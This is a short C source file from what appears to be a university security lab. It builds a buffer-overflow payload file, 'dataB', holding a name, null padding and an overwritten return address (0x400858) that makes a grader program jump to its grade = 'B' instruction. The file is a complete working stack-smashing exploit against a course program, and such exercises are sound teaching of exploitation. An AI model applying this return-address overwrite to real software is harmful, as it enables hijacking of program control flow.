/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Authors: Charles Coppieters 't wallant and Stephane Pienaar        */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/* 
   causes the grader program to write my name and recommend a grade of
   "B" by producing and writing to a file named dataB and returning 0
   upon complemtion. There is no input to this function. 
*/
int main(void) {
   /* length of the buf array */
   int BUFSIZE = 48;
   /* length of my name Charles */
   int nameSize = 7;
   /* int for the for loop */
   int i;
   /* address in the stack of line grade = 'B' */
   unsigned long ulData = 0x400858;
   /* file we will be writing to */
   FILE *psFile;
   
   /* creates file dataB and opens it for writing */
   psFile = fopen("dataB", "w");
   /* writes my name to dataB file */
   fprintf(psFile, "Charles");
   /* add \0 until the end of the buf array */
   for (i = 0; i < BUFSIZE-nameSize; i++) {
      putc('\0', psFile);
   }
   /* write to file the address of the grade = 'B" instruction
      so that now that we're past the buf, the next position in
      the stack is x30 which is supposed to return to main but
      instead it will now do the grade reassignment instruction */
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   /* closes file dataB */
   fclose(psFile);

   return 0;
}
